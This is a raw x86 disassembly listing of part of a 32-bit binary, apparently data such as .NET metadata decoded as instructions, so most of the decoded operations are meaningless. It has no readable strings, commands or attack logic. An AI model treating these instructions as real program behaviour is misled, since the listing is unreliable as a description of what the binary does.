  405cb1:	00 81 01 40 19 06    	add    %al,0x6194001(%ecx)
  405cb7:	00 71 1b             	add    %dh,0x1b(%ecx)
  405cba:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  405cbb:	05 0a 00 8c 21       	add    $0x218c000a,%eax
  405cc0:	31 1f                	xor    %ebx,(%edi)
  405cc2:	0a 00                	or     (%eax),%al
  405cc4:	b3 1b                	mov    $0x1b,%bl
  405cc6:	31 1f                	xor    %ebx,(%edi)
  405cc8:	06                   	push   %es
  405cc9:	00 0c 26             	add    %cl,(%esi,%eiz,1)
  405ccc:	30 00                	xor    %al,(%eax)
  405cce:	06                   	push   %es
  405ccf:	00 2c 1e             	add    %ch,(%esi,%ebx,1)
  405cd2:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  405cd3:	05 06 00 39 16       	add    $0x16390006,%eax
  405cd8:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  405cd9:	05 0a 00 ca 0f       	add    $0xfca000a,%eax
  405cde:	31 1f                	xor    %ebx,(%edi)
  405ce0:	06                   	push   %es
  405ce1:	00 84 1b a7 05 0a 00 	add    %al,0xa05a7(%ebx,%ebx,1)
  405ce8:	e8 0f 31 1f 06       	call   0x65f8dfc
  405ced:	00 8e 26 30 00 16    	add    %cl,0x16003026(%esi)
  405cf3:	00 84 20 a5 0b 06 00 	add    %al,0x60ba5(%eax,%eiz,1)
  405cfa:	68 17 30 00 06       	push   $0x6003017
  405cff:	00 9a 0f a7 05 06    	add    %bl,0x605a70f(%edx)
  405d05:	00 cc                	add    %cl,%ah
  405d07:	18 a7 05 06 00 5a    	sbb    %ah,0x5a000605(%edi)
  405d0d:	0e                   	push   %cs
  405d0e:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  405d0f:	05 06 00 39 1e       	add    $0x1e390006,%eax
  405d14:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  405d15:	05 06 00 7a 1b       	add    $0x1b7a0006,%eax
  405d1a:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  405d1b:	05 16 00 93 1b       	add    $0x1b930016,%eax
  405d20:	52                   	push   %edx
  405d21:	1f                   	pop    %ds
  405d22:	1a 00                	sbb    (%eax),%al
  405d24:	df 1d 3c 23 1a 00    	fistps 0x1a233c
  405d2a:	ab                   	stos   %eax,%es:(%edi)
  405d2b:	1a 3c 23             	sbb    (%ebx,%eiz,1),%bh
  405d2e:	8b 01                	mov    (%ecx),%eax
  405d30:	87 1e                	xchg   %ebx,(%esi)
  405d32:	00 00                	add    %al,(%eax)
  405d34:	1a 00                	sbb    (%eax),%al
  405d36:	26 22 3c 23          	and    %es:(%ebx,%eiz,1),%bh
  405d3a:	06                   	push   %es
  405d3b:	00 0e                	add    %cl,(%esi)
  405d3d:	1f                   	pop    %ds
  405d3e:	40                   	inc    %eax
  405d3f:	19 06                	sbb    %eax,(%esi)
  405d41:	00 4b 00             	add    %cl,0x0(%ebx)
  405d44:	40                   	inc    %eax
  405d45:	19 06                	sbb    %eax,(%esi)
  405d47:	00 37                	add    %dh,(%edi)
  405d49:	19 40 19             	sbb    %eax,0x19(%eax)
  405d4c:	06                   	push   %es
  405d4d:	00 6d 00             	add    %ch,0x0(%ebp)
  405d50:	40                   	inc    %eax
  405d51:	19 06                	sbb    %eax,(%esi)
  405d53:	00 26                	add    %ah,(%esi)
  405d55:	1d 24 26 06 00       	sbb    $0x62624,%eax
  405d5a:	6e                   	outsb  %ds:(%esi),(%dx)
  405d5b:	19 24 26             	sbb    %esp,(%esi,%eiz,1)
  405d5e:	06                   	push   %es
  405d5f:	00 81 10 40 19 06    	add    %al,0x6194010(%ecx)
  405d65:	00 cf                	add    %cl,%bh
  405d67:	19 40 19             	sbb    %eax,0x19(%eax)
  405d6a:	1e                   	push   %ds
  405d6b:	00 54 1a e1          	add    %dl,-0x1f(%edx,%ebx,1)
  405d6f:	20 06                	and    %al,(%esi)
  405d71:	00 c5                	add    %al,%ch
  405d73:	26 ff 17             	call   *%es:(%edi)
  405d76:	06                   	push   %es
  405d77:	00 19                	add    %bl,(%ecx)
  405d79:	18 ff                	sbb    %bh,%bh
  405d7b:	17                   	pop    %ss
  405d7c:	06                   	push   %es
  405d7d:	00 a8 0f ff 17 06    	add    %ch,0x617ff0f(%eax)
  405d83:	00 b8 0c 40 19 06    	add    %bh,0x619400c(%eax)
  405d89:	00 86 0f 5d 14 0a    	add    %al,0xa145d0f(%esi)
  405d8f:	00 f8                	add    %bh,%al
  405d91:	1d 30 00 0a 00       	sbb    $0xa0030,%eax
  405d96:	bf 21 30 00 06       	mov    $0x6003021,%edi
  405d9b:	00 e6                	add    %ah,%dh
  405d9d:	0d 30 00 43 00       	or     $0x430030,%eax
  405da2:	c4 1e                	les    (%esi),%ebx
  405da4:	00 00                	add    %al,(%eax)
  405da6:	12 00                	adc    (%eax),%al
  405da8:	03 0f                	add    (%edi),%ecx
  405daa:	ca 1c 06             	lret   $0x61c
  405dad:	00 0b                	add    %cl,(%ebx)
  405daf:	00 8a 0b 06 00 f3    	add    %cl,-0xcfff9f5(%edx)
  405db5:	19 40 19             	sbb    %eax,0x19(%eax)
  405db8:	06                   	push   %es
  405db9:	00 50 26             	add    %dl,0x26(%eax)
  405dbc:	7f 1a                	jg     0x405dd8
  405dbe:	06                   	push   %es
  405dbf:	00 f7                	add    %dh,%bh
  405dc1:	10 40 19             	adc    %al,0x19(%eax)
  405dc4:	06                   	push   %es
  405dc5:	00 cf                	add    %cl,%bh
  405dc7:	1e                   	push   %ds
  405dc8:	40                   	inc    %eax
  405dc9:	19 06                	sbb    %eax,(%esi)
  405dcb:	00 62 0f             	add    %ah,0xf(%edx)
  405dce:	40                   	inc    %eax
  405dcf:	19 22                	sbb    %esp,(%edx)
  405dd1:	00 a0 1b 7f 1d 22    	add    %ah,0x221d7f1b(%eax)
  405dd7:	00 4e 20             	add    %cl,0x20(%esi)
  405dda:	7f 1d                	jg     0x405df9
  405ddc:	22 00                	and    (%eax),%al
  405dde:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405ddf:	1d 7f 1d 12 00       	sbb    $0x121d7f,%eax
  405de4:	9e                   	sahf
  405de5:	1d 8f 1f 22 00       	sbb    $0x221f8f,%eax
  405dea:	66 20 7f 1d          	data16 and %bh,0x1d(%edi)
  405dee:	06                   	push   %es
  405def:	00 25 20 24 26 06    	add    %ah,0x6262420
  405df5:	00 00                	add    %al,(%eax)
  405df7:	1b 40 19             	sbb    0x19(%eax),%eax
  405dfa:	06                   	push   %es
  405dfb:	00 2c 20             	add    %ch,(%eax,%eiz,1)
  405dfe:	24 26                	and    $0x26,%al
  405e00:	12 00                	adc    (%eax),%al
  405e02:	58                   	pop    %eax
  405e03:	1d 24 26 06 00       	sbb    $0x62624,%eax
  405e08:	ef                   	out    %eax,(%dx)
  405e09:	18 24 26             	sbb    %ah,(%esi,%eiz,1)
  405e0c:	06                   	push   %es
  405e0d:	00 84 00 24 26 06 00 	add    %al,0x62624(%eax,%eax,1)
  405e14:	ea 1a 40 19 06 00 47 	ljmp   $0x4700,$0x619401a
  405e1b:	19 24 26             	sbb    %esp,(%esi,%eiz,1)
  405e1e:	06                   	push   %es
  405e1f:	00 9f 0e 24 26 06    	add    %bl,0x626240e(%edi)
  405e25:	00 63 0e             	add    %ah,0xe(%ebx)
  405e28:	24 26                	and    $0x26,%al
  405e2a:	06                   	push   %es
  405e2b:	00 9f 19 24 26 06    	add    %bl,0x6262419(%edi)
  405e31:	00 7e 0e             	add    %bh,0xe(%esi)
  405e34:	24 26                	and    $0x26,%al
  405e36:	06                   	push   %es
  405e37:	00 d3                	add    %dl,%bl
  405e39:	1a 24 26             	sbb    (%esi,%eiz,1),%ah
  405e3c:	06                   	push   %es
  405e3d:	00 bc 1d 40 19 06 00 	add    %bh,0x61940(%ebp,%ebx,1)
  405e44:	d0 25 40 19 06 00    	shlb   $1,0x61940
  405e4a:	58                   	pop    %eax
  405e4b:	21 8f 1f 06 00 3f    	and    %ecx,0x3f00061f(%edi)
  405e51:	0f 40 19             	cmovo  (%ecx),%ebx
  405e54:	06                   	push   %es
  405e55:	00 57 0c             	add    %dl,0xc(%edi)
  405e58:	24 26                	and    $0x26,%al
  405e5a:	06                   	push   %es
  405e5b:	00 64 00 40          	add    %ah,0x40(%eax,%eax,1)
  405e5f:	19 06                	sbb    %eax,(%esi)
  405e61:	00 1c 0f             	add    %bl,(%edi,%ecx,1)
  405e64:	40                   	inc    %eax
  405e65:	19 06                	sbb    %eax,(%esi)
  405e67:	00 93 0f 40 19 06    	add    %dl,0x619400f(%ebx)
  405e6d:	00 77 21             	add    %dh,0x21(%edi)
  405e70:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  405e71:	05 06 00 fc 10       	add    $0x10fc0006,%eax
  405e76:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  405e77:	05 0a 00 fc 18       	add    $0x18fc000a,%eax
  405e7c:	3e 1a 0a             	sbb    %ds:(%edx),%cl
  405e7f:	00 8f 0e 3e 1a 00    	add    %cl,0x1a3e0e(%edi)
  405e85:	00 00                	add    %al,(%eax)
  405e87:	00 98 00 00 00 00    	add    %bl,0x0(%eax)
  405e8d:	00 01                	add    %al,(%ecx)
  405e8f:	00 01                	add    %al,(%ecx)
  405e91:	00 01                	add    %al,(%ecx)
  405e93:	00 10                	add    %dl,(%eax)
  405e95:	00 e7                	add    %ah,%bh
  405e97:	02 37                	add    (%edi),%dh
  405e99:	21 05 00 01 00 01    	and    %eax,0x1000100
  405e9f:	00 81 01 10 00 ee    	add    %al,-0x11ffefff(%ecx)
  405ea5:	1b 37                	sbb    (%edi),%esi
  405ea7:	21 05 00 01 00 03    	and    %eax,0x3000100
  405ead:	00 81 01 10 00 13    	add    %al,0x13001001(%ecx)
  405eb3:	05 8a 24 05 00       	add    $0x5248a,%eax
  405eb8:	13 00                	adc    (%eax),%eax
  405eba:	06                   	push   %es
  405ebb:	00 00                	add    %al,(%eax)
  405ebd:	00 10                	add    %dl,(%eax)
  405ebf:	00 c7                	add    %al,%bh
  405ec1:	09 c3                	or     %eax,%ebx
  405ec3:	05 05 00 1e 00       	add    $0x1e0005,%eax
  405ec8:	24 00                	and    $0x0,%al
  405eca:	00 00                	add    %al,(%eax)
  405ecc:	10 00                	adc    %al,(%eax)
  405ece:	d4 08                	aam    $0x8
  405ed0:	e7 23                	out    %eax,$0x23
  405ed2:	05 00 1e 00 26       	add    $0x26001e00,%eax
  405ed7:	00 81 01 10 00 7a    	add    %al,0x7a001001(%ecx)
  405edd:	06                   	push   %es
  405ede:	e7 23                	out    %eax,$0x23
  405ee0:	05 00 1e 00 2d       	add    $0x2d001e00,%eax
  405ee5:	00 81 01 10 00 6b    	add    %al,0x6b001001(%ecx)
  405eeb:	1e                   	push   %ds
  405eec:	e7 23                	out    %eax,$0x23
  405eee:	05 00 1e 00 2f       	add    $0x2f001e00,%eax
  405ef3:	00 81 01 10 00 9d    	add    %al,-0x62ffefff(%ecx)
  405ef9:	15 e7 23 05 00       	adc    $0x523e7,%eax
  405efe:	1e                   	push   %ds
  405eff:	00 30                	add    %dh,(%eax)
  405f01:	00 81 01 10 00 f4    	add    %al,-0xbffefff(%ecx)
  405f07:	24 e7                	and    $0xe7,%al
  405f09:	23 05 00 1e 00 36    	and    0x36001e00,%eax
  405f0f:	00 81 01 10 00 1a    	add    %al,0x1a001001(%ecx)
  405f15:	06                   	push   %es
  405f16:	e7 23                	out    %eax,$0x23
  405f18:	05 00 1f 00 38       	add    $0x38001f00,%eax
  405f1d:	00 02                	add    %al,(%edx)
  405f1f:	01 00                	add    %eax,(%eax)
  405f21:	00 b4 24 00 00 39 00 	add    %dh,0x390000(%esp)
  405f28:	1f                   	pop    %ds
  405f29:	00 3e                	add    %bh,(%esi)
  405f2b:	00 81 01 10 00 f8    	add    %al,-0x7ffefff(%ecx)
  405f31:	0d e7 23 05 00       	or     $0x523e7,%eax
  405f36:	23 00                	and    (%eax),%eax
  405f38:	3e 00 81 01 10 00 44 	add    %al,%ds:0x44001001(%ecx)
  405f3f:	1f                   	pop    %ds
  405f40:	e7 23                	out    %eax,$0x23
  405f42:	05 00 23 00 41       	add    $0x41002300,%eax
  405f47:	00 81 01 10 00 d3    	add    %al,-0x2cffefff(%ecx)
  405f4d:	21 cc                	and    %ecx,%esp
  405f4f:	02 05 00 24 00 46    	add    0x46002400,%al
  405f55:	00 83 01 10 00 4a    	add    %al,0x4a001001(%ebx)
  405f5b:	01 00                	add    %eax,(%eax)
  405f5d:	00 05 00 25 00 4b    	add    %al,0x4b002500
  405f63:	00 01                	add    %al,(%ecx)
  405f65:	00 10                	add    %dl,(%eax)
  405f67:	00 1e                	add    %bl,(%esi)
  405f69:	04 3b                	add    $0x3b,%al
  405f6b:	09 05 00 26 00 4b    	or     %eax,0x4b002600
  405f71:	00 81 01 10 00 df    	add    %al,-0x20ffefff(%ecx)
  405f77:	21 3b                	and    %edi,(%ebx)
  405f79:	09 05 00 2d 00 52    	or     %eax,0x52002d00
  405f7f:	00 00                	add    %al,(%eax)
  405f81:	01 00                	add    %eax,(%eax)
  405f83:	00 c6                	add    %al,%dh
  405f85:	22 00                	and    (%eax),%al
  405f87:	00 05 00 2d 00 54    	add    %al,0x54002d00
  405f8d:	00 13                	add    %dl,(%ebx)
  405f8f:	01 00                	add    %eax,(%eax)
  405f91:	00 57 0a             	add    %dl,0xa(%edi)
  405f94:	00 00                	add    %al,(%eax)
  405f96:	51                   	push   %ecx
  405f97:	00 2e                	add    %ch,(%esi)
  405f99:	00 54 00 01          	add    %dl,0x1(%eax,%eax,1)
  405f9d:	00 10                	add    %dl,(%eax)
  405f9f:	00 84 01 a5 04 05 00 	add    %al,0x504a5(%ecx,%eax,1)
  405fa6:	2e 00 54 00 01       	add    %dl,%cs:0x1(%eax,%eax,1)
  405fab:	00 10                	add    %dl,(%eax)
  405fad:	00 0d 08 a5 04 05    	add    %cl,0x504a508
  405fb3:	00 2f                	add    %ch,(%edi)
  405fb5:	00 5f 00             	add    %bl,0x0(%edi)
  405fb8:	01 00                	add    %eax,(%eax)
  405fba:	10 00                	adc    %al,(%eax)
  405fbc:	d0 1b                	rcrb   $1,(%ebx)
  405fbe:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405fbf:	04 05                	add    $0x5,%al
  405fc1:	00 31                	add    %dh,(%ecx)
  405fc3:	00 63 00             	add    %ah,0x0(%ebx)
  405fc6:	01 00                	add    %eax,(%eax)
  405fc8:	10 00                	adc    %al,(%eax)
  405fca:	62 16                	bound  %edx,(%esi)
  405fcc:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405fcd:	04 05                	add    $0x5,%al
  405fcf:	00 33                	add    %dh,(%ebx)
  405fd1:	00 6a 00             	add    %ch,0x0(%edx)
  405fd4:	01 01                	add    %eax,(%ecx)
  405fd6:	00 00                	add    %al,(%eax)
  405fd8:	29 21                	sub    %esp,(%ecx)
  405fda:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405fdb:	04 39                	add    $0x39,%al
  405fdd:	00 3a                	add    %bh,(%edx)
  405fdf:	00 95 00 00 00 10    	add    %dl,0x10000000(%ebp)
  405fe5:	00 e3                	add    %ah,%bl
  405fe7:	07                   	pop    %es
  405fe8:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405fe9:	04 05                	add    $0x5,%al
  405feb:	00 47 00             	add    %al,0x0(%edi)
  405fee:	95                   	xchg   %eax,%ebp
  405fef:	00 00                	add    %al,(%eax)
  405ff1:	00 10                	add    %dl,(%eax)
  405ff3:	00 4b 0c             	add    %cl,0xc(%ebx)
  405ff6:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405ff7:	04 05                	add    $0x5,%al
  405ff9:	00 47 00             	add    %al,0x0(%edi)
  405ffc:	99                   	cltd
  405ffd:	00 81 01 10 00 02    	add    %al,0x2001001(%ecx)
  406003:	04 a5                	add    $0xa5,%al
  406005:	04 05                	add    $0x5,%al
  406007:	00 47 00             	add    %al,0x0(%edi)
  40600a:	a2 00 00 01 00       	mov    %al,0x10000
  40600f:	00 5d 04             	add    %bl,0x4(%ebp)
  406012:	00 00                	add    %al,(%eax)
  406014:	05 00 47 00 a4       	add    $0xa4004700,%eax
  406019:	00 13                	add    %dl,(%ebx)
  40601b:	01 00                	add    %eax,(%eax)
  40601d:	00 f3                	add    %dh,%bl
  40601f:	02 00                	add    (%eax),%al
  406021:	00 51 00             	add    %dl,0x0(%ecx)
  406024:	48                   	dec    %eax
  406025:	00 a4 00 16 00 8f 0a 	add    %ah,0xa8f0016(%eax,%eax,1)
  40602c:	12 00                	adc    (%eax),%al
  40602e:	16                   	push   %ss
  40602f:	00 2f                	add    %ch,(%edi)
  406031:	01 12                	add    %edx,(%edx)
  406033:	00 16                	add    %dl,(%esi)
  406035:	00 11                	add    %dl,(%ecx)
  406037:	0a 12                	or     (%edx),%dl
  406039:	00 16                	add    %dl,(%esi)
  40603b:	00 1f                	add    %bl,(%edi)
  40603d:	0a 12                	or     (%edx),%dl
  40603f:	00 16                	add    %dl,(%esi)
  406041:	00 a2 1c 12 00 16    	add    %ah,0x1600121c(%edx)
  406047:	00 c8                	add    %cl,%al
  406049:	00 12                	add    %dl,(%edx)
  40604b:	00 16                	add    %dl,(%esi)
  40604d:	00 48 1b             	add    %cl,0x1b(%eax)
  406050:	12 00                	adc    (%eax),%al
  406052:	16                   	push   %ss
  406053:	00 bd 1c 12 00 16    	add    %bh,0x1600121c(%ebp)
  406059:	00 c0                	add    %al,%al
  40605b:	19 12                	sbb    %edx,(%edx)
  40605d:	00 16                	add    %dl,(%esi)
  40605f:	00 af 0a 12 00 16    	add    %ch,0x1600120a(%edi)
  406065:	00 95 18 15 00 16    	add    %dl,0x16001518(%ebp)
  40606b:	00 9d 01 12 00 16    	add    %bl,0x16001201(%ebp)
  406071:	00 36                	add    %dh,(%esi)
  406073:	07                   	pop    %es
  406074:	19 00                	sbb    %eax,(%eax)
  406076:	16                   	push   %ss
  406077:	00 d8                	add    %bl,%al
  406079:	0b 12                	or     (%edx),%edx
  40607b:	00 16                	add    %dl,(%esi)
  40607d:	00 c0                	add    %al,%al
  40607f:	18 12                	sbb    %dl,(%edx)
  406081:	00 16                	add    %dl,(%esi)
  406083:	00 67 01             	add    %ah,0x1(%edi)
  406086:	12 00                	adc    (%eax),%al
  406088:	16                   	push   %ss
  406089:	00 e3                	add    %ah,%bl
  40608b:	26 12 00             	adc    %es:(%eax),%al
  40608e:	16                   	push   %ss
  40608f:	00 44 18 12          	add    %al,0x12(%eax,%ebx,1)
  406093:	00 11                	add    %dl,(%ecx)
  406095:	00 c4                	add    %al,%ah
  406097:	0d 21 00 11 00       	or     $0x110021,%eax
  40609c:	a9 0d 25 00 11       	test   $0x1100250d,%eax
  4060a1:	00 79 0d             	add    %bh,0xd(%ecx)
  4060a4:	29 00                	sub    %eax,(%eax)
  4060a6:	11 00                	adc    %eax,(%eax)
  4060a8:	0f 0d 2d 00 11 00 91 	prefetch 0x91001100
  4060af:	0d 2d 00 11 00       	or     $0x11002d,%eax
  4060b4:	f4                   	hlt
  4060b5:	0c 30                	or     $0x30,%al
  4060b7:	00 11                	add    %dl,(%ecx)
  4060b9:	00 d7                	add    %dl,%bh
  4060bb:	0c 34                	or     $0x34,%al
  4060bd:	00 31                	add    %dh,(%ecx)
  4060bf:	00 bd 0c 37 00 11    	add    %bh,0x1100370c(%ebp)
  4060c5:	00 2b                	add    %ch,(%ebx)
  4060c7:	0d 30 00 11 00       	or     $0x110030,%eax
  4060cc:	5f                   	pop    %edi
  4060cd:	0d 3a 00 11 00       	or     $0x11003a,%eax
  4060d2:	41                   	inc    %ecx
  4060d3:	0d 34 00 16 00       	or     $0x160034,%eax
  4060d8:	9f                   	lahf
  4060d9:	08 dc                	or     %bl,%ah
  4060db:	00 06                	add    %al,(%esi)
  4060dd:	06                   	push   %es
  4060de:	87 0a                	xchg   %ecx,(%edx)
  4060e0:	06                   	push   %es
  4060e1:	01 56 80             	add    %edx,-0x80(%esi)
  4060e4:	02 0b                	add    (%ebx),%cl
  4060e6:	09 01                	or     %eax,(%ecx)
  4060e8:	56                   	push   %esi
  4060e9:	80 0d 0b 09 01 56 80 	orb    $0x80,0x5601090b
  4060f0:	5f                   	pop    %edi
  4060f1:	1e                   	push   %ds
  4060f2:	09 01                	or     %eax,(%ecx)
  4060f4:	31 00                	xor    %eax,(%eax)
  4060f6:	cf                   	iret
  4060f7:	04 12                	add    $0x12,%al
  4060f9:	00 16                	add    %dl,(%esi)
  4060fb:	00 b9 06 30 01 16    	add    %bh,0x16013006(%ecx)
  406101:	00 35 08 43 01 51    	add    %dh,0x51014308
  406107:	80 2f 1b             	subb   $0x1b,(%edi)
  40610a:	3a 00                	cmp    (%eax),%al
  40610c:	51                   	push   %ecx
  40610d:	80 b0 04 3a 00 51 80 	xorb   $0x80,0x51003a04(%eax)
  406114:	25 08 3a 00 51       	and    $0x51003a08,%eax
  406119:	80 a4 0c 3a 00 21 00 	andb   $0x10,0x21003a(%esp,%ecx,1)
  406120:	10 
  406121:	07                   	pop    %es
  406122:	29 00                	sub    %eax,(%eax)
  406124:	21 00                	and    %eax,(%eax)
  406126:	b8 15 29 00 31       	mov    $0x31002915,%eax
  40612b:	00 c0                	add    %al,%al
  40612d:	02 29                	add    (%ecx),%ch
  40612f:	00 33                	add    %dh,(%ebx)
  406131:	01 22                	add    %esp,(%edx)
  406133:	1f                   	pop    %ds
  406134:	8b 01                	mov    (%ecx),%eax
  406136:	11 00                	adc    %eax,(%eax)
  406138:	72 01                	jb     0x40613b
  40613a:	8f 01                	pop    (%ecx)
  40613c:	01 00                	add    %eax,(%eax)
  40613e:	3e 03 30             	add    %ds:(%eax),%esi
  406141:	01 01                	add    %eax,(%ecx)
  406143:	00 2b                	add    %ch,(%ebx)
  406145:	04 3a                	add    $0x3a,%al
  406147:	00 01                	add    %al,(%ecx)
  406149:	00 3e                	add    %bh,(%esi)
  40614b:	03 30                	add    (%eax),%esi
  40614d:	01 01                	add    %eax,(%ecx)
  40614f:	00 77 03             	add    %dh,0x3(%edi)
  406152:	c7 01 01 00 2d 05    	movl   $0x52d0001,(%ecx)
  406158:	12 00                	adc    (%eax),%al
  40615a:	01 00                	add    %eax,(%eax)
  40615c:	dd 05 12 00 01 00    	fldl   0x10012
  406162:	2e 09 37             	or     %esi,%cs:(%edi)
  406165:	00 01                	add    %al,(%ecx)
  406167:	00 88 25 02 02 01    	add    %cl,0x1020225(%eax)
  40616d:	00 97 02 c7 01 01    	add    %dl,0x101c702(%edi)
  406173:	00 3e                	add    %bh,(%esi)
  406175:	03 30                	add    (%eax),%esi
  406177:	01 01                	add    %eax,(%ecx)
  406179:	00 f7                	add    %dh,%bh
  40617b:	15 06 02 06 06       	adc    $0x6060206,%eax
  406180:	87 0a                	xchg   %ecx,(%edx)
  406182:	3a 00                	cmp    (%eax),%al
  406184:	56                   	push   %esi
  406185:	80 56 0b 02          	adcb   $0x2,0xb(%esi)
  406189:	02 56 80             	add    -0x80(%esi),%dl
  40618c:	53                   	push   %ebx
  40618d:	05 02 02 56 80       	add    $0x80560202,%eax
  406192:	07                   	pop    %es
  406193:	05 02 02 56 80       	add    $0x80560202,%eax
  406198:	cc                   	int3
  406199:	24 02                	and    $0x2,%al
  40619b:	02 56 80             	add    -0x80(%esi),%dl
  40619e:	a3 22 02 02 56       	mov    %eax,0x56020222
  4061a3:	80 6e 0a 02          	subb   $0x2,0xa(%esi)
  4061a7:	02 56 80             	add    -0x80(%esi),%dl
  4061aa:	e7 24                	out    %eax,$0x24
  4061ac:	02 02                	add    (%edx),%al
  4061ae:	56                   	push   %esi
  4061af:	80 7a 07 02          	cmpb   $0x2,0x7(%edx)
  4061b3:	02 56 80             	add    -0x80(%esi),%dl
  4061b6:	3a 05 02 02 56 80    	cmp    0x80560202,%al
  4061bc:	89 04 02             	mov    %eax,(%edx,%eax,1)
  4061bf:	02 56 80             	add    -0x80(%esi),%dl
  4061c2:	98                   	cwtl
  4061c3:	24 02                	and    $0x2,%al
  4061c5:	02 56 80             	add    -0x80(%esi),%dl
  4061c8:	db 02                	fildl  (%edx)
  4061ca:	02 02                	add    (%edx),%al
  4061cc:	33 01                	xor    (%ecx),%eax
  4061ce:	b7 16                	mov    $0x16,%bh
  4061d0:	fd                   	std
  4061d1:	02 08                	add    (%eax),%cl
  4061d3:	26 00 00             	add    %al,%es:(%eax)
  4061d6:	00 00                	add    %al,(%eax)
  4061d8:	96                   	xchg   %eax,%esi
  4061d9:	00 e4                	add    %ah,%ah
  4061db:	19 0a                	sbb    %ecx,(%edx)
  4061dd:	00 01                	add    %al,(%ecx)
  4061df:	00 78 20             	add    %bh,0x20(%eax)
  4061e2:	00 00                	add    %al,(%eax)
  4061e4:	00 00                	add    %al,(%eax)
  4061e6:	86 18                	xchg   %bl,(%eax)
  4061e8:	d9 1e                	fstps  (%esi)
  4061ea:	0e                   	push   %cs
  4061eb:	00 01                	add    %al,(%ecx)
  4061ed:	00 f8                	add    %bh,%al
  4061ef:	26 00 00             	add    %al,%es:(%eax)
  4061f2:	00 00                	add    %al,(%eax)
  4061f4:	96                   	xchg   %eax,%esi
  4061f5:	00 e1                	add    %ah,%cl
  4061f7:	06                   	push   %es
  4061f8:	1d 00 01 00 50       	sbb    $0x50000100,%eax
  4061fd:	28 00                	sub    %al,(%eax)
  4061ff:	00 00                	add    %al,(%eax)
  406201:	00 91 00 01 03 1d    	add    %dl,0x1d030100(%ecx)
  406207:	00 01                	add    %al,(%ecx)
  406209:	00 c0                	add    %al,%al
  40620b:	28 00                	sub    %al,(%eax)
  40620d:	00 00                	add    %al,(%eax)
  40620f:	00 91 18 df 1e 0a    	add    %dl,0xa1edf18(%ecx)
  406215:	00 01                	add    %al,(%ecx)
  406217:	00 80 20 00 00 00    	add    %al,0x20(%eax)
  40621d:	00 96 08 0b 23 3d    	add    %dl,0x3d230b08(%esi)
  406223:	00 01                	add    %al,(%ecx)
  406225:	00 87 20 00 00 00    	add    %al,0x20(%edi)
  40622b:	00 96 08 19 23 42    	add    %dl,0x42231908(%esi)
  406231:	00 01                	add    %al,(%ecx)
  406233:	00 8f 20 00 00 00    	add    %cl,0x20(%edi)
  406239:	00 96 08 ef 22 48    	add    %dl,0x4822ef08(%esi)
  40623f:	00 02                	add    %al,(%edx)
  406241:	00 96 20 00 00 00    	add    %dl,0x20(%esi)
  406247:	00 96 08 fd 22 4d    	add    %dl,0x4d22fd08(%esi)
  40624d:	00 02                	add    %al,(%edx)
  40624f:	00 9e 20 00 00 00    	add    %bl,0x20(%esi)
  406255:	00 91 08 ad 1d 53    	add    %dl,0x531dad08(%ecx)
  40625b:	00 03                	add    %al,(%ebx)
  40625d:	00 a5 20 00 00 00    	add    %ah,0x20(%ebp)
  406263:	00 91 08 b8 1d 58    	add    %dl,0x581db808(%ecx)
  406269:	00 03                	add    %al,(%ebx)
  40626b:	00 ad 20 00 00 00    	add    %ch,0x20(%ebp)
  406271:	00 91 08 83 13 5e    	add    %dl,0x5e138308(%ecx)
  406277:	00 04 00             	add    %al,(%eax,%eax,1)
  40627a:	b4 20                	mov    $0x20,%ah
  40627c:	00 00                	add    %al,(%eax)
  40627e:	00 00                	add    %al,(%eax)
  406280:	91                   	xchg   %eax,%ecx
  406281:	08 92 13 62 00 04    	or     %dl,0x4006213(%edx)
  406287:	00 bc 20 00 00 00 00 	add    %bh,0x0(%eax,%eiz,1)
  40628e:	91                   	xchg   %eax,%ecx
  40628f:	08 8d 22 5e 00 05    	or     %cl,0x5005e22(%ebp)
  406295:	00 c3                	add    %al,%bl
  406297:	20 00                	and    %al,(%eax)
  406299:	00 00                	add    %al,(%eax)
  40629b:	00 91 08 98 22 62    	add    %dl,0x62229808(%ecx)
  4062a1:	00 05 00 cb 20 00    	add    %al,0x20cb00
  4062a7:	00 00                	add    %al,(%eax)
  4062a9:	00 91 08 44 13 67    	add    %dl,0x67134408(%ecx)
  4062af:	00 06                	add    %al,(%esi)
  4062b1:	00 d2                	add    %dl,%dl
  4062b3:	20 00                	and    %al,(%eax)
  4062b5:	00 00                	add    %al,(%eax)
  4062b7:	00 91 08 52 13 6c    	add    %dl,0x6c135208(%ecx)
  4062bd:	00 06                	add    %al,(%esi)
  4062bf:	00 da                	add    %bl,%dl
  4062c1:	20 00                	and    %al,(%eax)
  4062c3:	00 00                	add    %al,(%eax)
  4062c5:	00 96 08 73 0c 1d    	add    %dl,0x1d0c7308(%esi)
  4062cb:	00 07                	add    %al,(%edi)
  4062cd:	00 e1                	add    %ah,%cl
  4062cf:	20 00                	and    %al,(%eax)
  4062d1:	00 00                	add    %al,(%eax)
  4062d3:	00 96 08 83 0c 72    	add    %dl,0x720c8308(%esi)
  4062d9:	00 07                	add    %al,(%edi)
  4062db:	00 e9                	add    %ch,%cl
  4062dd:	20 00                	and    %al,(%eax)
  4062df:	00 00                	add    %al,(%eax)
  4062e1:	00 91 08 cb 0b 77    	add    %dl,0x770bcb08(%ecx)
  4062e7:	00 08                	add    %cl,(%eax)
  4062e9:	00 f0                	add    %dh,%al
  4062eb:	20 00                	and    %al,(%eax)
  4062ed:	00 00                	add    %al,(%eax)
  4062ef:	00 91 08 4b 14 67    	add    %dl,0x67144b08(%ecx)
  4062f5:	00 08                	add    %cl,(%eax)
  4062f7:	00 f7                	add    %dh,%bh
  4062f9:	20 00                	and    %al,(%eax)
  4062fb:	00 00                	add    %al,(%eax)
  4062fd:	00 91 08 54 14 6c    	add    %dl,0x6c145408(%ecx)
  406303:	00 08                	add    %cl,(%eax)
  406305:	00 ff                	add    %bh,%bh
  406307:	20 00                	and    %al,(%eax)
